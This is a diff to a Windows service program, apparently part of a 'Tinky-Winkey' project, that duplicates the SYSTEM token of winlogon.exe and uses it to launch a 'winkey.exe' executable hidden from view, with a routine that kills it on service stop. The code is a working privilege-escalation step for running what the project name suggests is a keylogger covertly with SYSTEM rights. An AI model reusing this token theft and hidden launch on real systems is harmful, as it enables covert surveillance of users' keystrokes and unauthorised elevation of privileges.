@@ -3,6 +3,7 @@
 #include <iostream>
 #include "tinky.h"
 #include <Tlhelp32.h>
+#include <process.h>
 
 
 SC_HANDLE               scmH;
@@ -70,7 +71,7 @@ void SvcInstall()
         printf("Cannot install service (%d)\n", GetLastError());
         return;
     }
-    strcat(Path, "\\tinky.exe");
+    strcat(Path, "\\svc.exe");
 
     schService = CreateService(
         scmH,              // SCM database 
@@ -110,26 +111,6 @@ void StopSvc() {
     if (!ControlService(serviceH, SERVICE_CONTROL_STOP, &g_ServiceStatus)) {
         printf("Stop Service failed (%d)\n", GetLastError());
     }
-}
-
-DWORD GetPidByName(const char* filename)
-{
-    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
-    PROCESSENTRY32 pEntry;
-    pEntry.dwSize = sizeof(PROCESSENTRY32);
-    BOOL hRes = Process32First(hSnapShot, &pEntry);
-    while (hRes)
-    {
-        if (strcmp(pEntry.szExeFile, filename) == 0)
-        {
-            printf("%lu", pEntry.th32ProcessID);
-            CloseHandle(hSnapShot);
-            return(pEntry.th32ProcessID);
-        }
-        hRes = Process32Next(hSnapShot, &pEntry);
-    }
-    CloseHandle(hSnapShot);
-    return(0);
 }
 
 int main(int argc, CHAR **argv)
@@ -195,9 +176,8 @@ int main(int argc, CHAR **argv)
     }
 }
 
-DWORD GetPidByName()
+DWORD GetPidByName(char* filename)
 {
-    char* filename = "winlogon.exe";
     HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
     PROCESSENTRY32 pEntry;
     pEntry.dwSize = sizeof(PROCESSENTRY32);
@@ -206,7 +186,6 @@ DWORD GetPidByName()
     {
         if (strcmp(pEntry.szExeFile, filename) == 0)
         {
-            printf("%lu", pEntry.th32ProcessID);
             CloseHandle(hSnapShot);
             return(pEntry.th32ProcessID);
         }
@@ -221,26 +200,34 @@ void    Tinky_Winky() {
     HANDLE wlPH;
     HANDLE wlTH;
     HANDLE newExecToken;
+    PROCESS_INFORMATION winkeyPI;
     char Path[260];
-    LPWSTR PP = L"C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
+    LPWSTR PP = L"c:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
 
-    winlogonPID = GetPidByName();
+    winlogonPID = GetPidByName("winlogon.exe");
     wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
     if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
         printf("opt\n");
     }
     CloseHandle(wlPH);
-    if (!DuplicateTokenEx(wlTH, TOKEN_DUPLICATE, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
+    if (!DuplicateTokenEx(wlTH, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
         printf("dtEx\n");
     }
     CloseHandle(wlTH);
-    GetCurrentDirectory(260, Path);
-    strcat(Path, "\\winkey.exe 1337");
-    int i = 0;
 
     if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
-        printf("cpwt\n");
+        printf("cpwt (%d)\n", GetLastError());
     }
+}
+
+void    Tinky_Winky_Die() {
+    DWORD winkeyPID;
+    HANDLE wkPH;
+
+    winkeyPID = GetPidByName("winkey.exe");
+    wkPH = OpenProcess(PROCESS_TERMINATE, 0, winkeyPID);
+    TerminateProcess(wkPH, 1);
+    CloseHandle(wkPH);
 }
 
 VOID WINAPI ServiceMain() {
@@ -271,6 +258,7 @@ VOID WINAPI		ServiceCtrlHandler(DWORD CtrlCode) {
             if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
                 break;
             // stop winkey here
+            Tinky_Winky_Die();
             ReportStatus(SERVICE_STOPPED, NO_ERROR);
             break;
         default:
@@ -279,17 +267,6 @@ VOID WINAPI		ServiceCtrlHandler(DWORD CtrlCode) {
 }
 
 void ReportStatus(DWORD state, DWORD Q_ERROR) {
-    /*
-    * typedef struct _SERVICE_STATUS {
-          DWORD dwServiceType;
-          DWORD dwCurrentState;
-          DWORD dwControlsAccepted;
-          DWORD dwWin32ExitCode;
-          DWORD dwServiceSpecificExitCode;
-          DWORD dwCheckPoint;
-          DWORD dwWaitHint;
-       } SERVICE_STATUS, *LPSERVICE_STATUS;
-     */
     g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     g_ServiceStatus.dwControlsAccepted = state == SERVICE_START_PENDING ? 0 : SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
     g_ServiceStatus.dwCurrentState = state;
@@ -297,14 +274,5 @@ void ReportStatus(DWORD state, DWORD Q_ERROR) {
     g_ServiceStatus.dwServiceSpecificExitCode = 0;
     g_ServiceStatus.dwCheckPoint = 0;
 
-    /*g_ServiceStatus = {
-        SERVICE_WIN32_OWN_PROCESS,
-        state,
-        state == SERVICE_START_PENDING ? 0 : SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN,
-        Q_ERROR,
-        0,
-        0,
-        0,
-    };*/
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
 }
